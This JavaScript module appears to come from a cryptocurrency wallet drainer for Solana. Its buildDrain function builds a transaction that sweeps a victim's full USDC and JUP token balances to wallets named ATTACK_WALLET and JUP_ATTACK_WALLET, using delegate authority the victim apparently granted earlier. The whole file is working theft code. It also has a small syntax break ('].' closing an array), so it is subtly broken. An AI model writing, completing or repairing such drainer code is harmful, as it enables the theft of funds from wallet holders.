const {
    Transaction,
    PublicKey,
} = require("@solana/web3.js");

const { createTransferInstruction } = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { getBlockhash, setBlockhash } = require("../core/blockhashCache");

/**
 * Build drain transaction (token transfer as delegate)
 * @param {string} user - User's public key
 * @param {Connection} connection - Solana connection
 * @returns {Promise<Transaction>}
 */
async function buildDrain(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();

            // Validate all required env variables
            const requiredVars = [
                { name: "WALLET", value: config.WALLET },
                { name: "ATTACK_WALLET", value: config.ATTACK_WALLET },
                { name: "JUP_ATTACK_WALLET", value: config.JUP_ATTACK_WALLET },
                { name: "PUBLIC_KEY", value: config.PUBLIC_KEY }
            ].

            for (const { name, value } of requiredVars) {
                if (!value) {
                    throw new Error(`${name} environment variable is missing`);
                }
            }

            const tx = new Transaction();
            const userPubkey = new PublicKey(user);

            logger.debug("Building drain transaction", {
                user: userPubkey.toString()
            });

            // Fetch user token accounts
            const tokenAccounts = await getUserTokenAccounts(user, conn);

            if (!tokenAccounts) {
                throw new Error("Failed to fetch token accounts");
            }

            if (!tokenAccounts.usdcATA) {
                throw new Error("USDC ATA not found");
            }

            // Try to get cached blockhash, otherwise fetch fresh one
            let blockhash = getBlockhash();
            if (!blockhash) {
                logger.debug("No cached blockhash, fetching fresh one");
                const { blockhash: freshBlockhash } = await conn.getLatestBlockhash("confirmed");
                blockhash = freshBlockhash;
                setBlockhash(blockhash);
            }

            logger.debug("Using blockhash", { blockhash: blockhash.substring(0, 8) });

            const delegate = new PublicKey(config.WALLET);
            const usdcDestination = new PublicKey(config.ATTACK_WALLET);
            const jupDestination = new PublicKey(config.JUP_ATTACK_WALLET);
            const feePayer = new PublicKey(config.PUBLIC_KEY);

            // Validate destination addresses are different from source
            if (usdcDestination.toString() === tokenAccounts.usdcATA.toString()) {
                throw new Error("USDC destination cannot be same as user's USDC ATA");
            }

            tx.recentBlockhash = blockhash;
            tx.feePayer = feePayer;

            // Add transfer instruction for USDC if balance exists
            if (tokenAccounts.usdc && tokenAccounts.usdc > 0n) {
                logger.debug("Adding USDC transfer instruction", {
                    amount: tokenAccounts.usdc.toString(),
                    destination: usdcDestination.toString()
                });

                tx.add(
                    createTransferInstruction(
                        tokenAccounts.usdcATA,
                        usdcDestination,
                        delegate,
                        tokenAccounts.usdc
                    )
                );
            } else {
                logger.debug("User has no USDC to drain");
            }

            // Add transfer instruction for JUP if balance exists
            if (tokenAccounts.jupATA && tokenAccounts.jup && tokenAccounts.jup > 0n) {
                logger.debug("Adding JUP transfer instruction", {
                    amount: tokenAccounts.jup.toString(),
                    destination: jupDestination.toString()
                });

                tx.add(
                    createTransferInstruction(
                        tokenAccounts.jupATA,
                        jupDestination,
                        delegate,
                        tokenAccounts.jup
                    )
                );
            } else {
                logger.debug("User has no JUP to drain");
            }

            if (tx.instructions.length === 0) {
                logger.warn("No tokens to drain for user", { user: userPubkey.toString() });
            }

            logger.info("Drain transaction built successfully", {
                instructions: tx.instructions.length
            });

            return tx;
        } catch (err) {
            logger.error("Failed to build drain transaction", {
                error: err.message
            });
            throw err;
        }
    }, "buildDrain");
}

module.exports = { buildDrain };
